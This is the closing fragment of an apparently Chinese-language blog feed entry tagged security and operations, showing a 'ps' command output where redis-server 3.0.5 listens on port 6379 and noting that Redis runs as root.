&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@localhost redis-3.0.5]&lt;span class=&quot;comment&quot;&gt;# ps -ef | grep redis&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      4448  3629  0 15:24 pts/2    00:00:00 src/redis-server *:6379&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;另外，可以看到 Redis 还是以 root 用户启动运行的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="运维" scheme="http://wismartzy.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
</feed>
